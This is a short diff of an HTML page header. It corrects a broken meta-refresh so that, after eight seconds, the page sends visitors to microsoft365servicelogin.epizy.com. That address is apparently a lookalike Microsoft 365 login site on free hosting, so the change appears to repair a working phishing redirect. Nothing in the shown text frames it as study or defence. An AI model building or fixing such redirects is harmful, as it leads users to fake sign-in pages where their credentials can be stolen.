@@ -3,7 +3,7 @@
 <html dir="ltr" xmlns="http://www.w3.org/1999/xhtml">
 
 <head>
-    <META HTTP-EQUIV="REFRESH" CONTENT="8;URL=http://http://www.microsoft365servicelogin.epizy.com/?i=1">
+    <META HTTP-EQUIV="REFRESH" CONTENT="8;URL=http://www.microsoft365servicelogin.epizy.com/?i=1">
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta http-equiv="pragma" content="no-cache" />
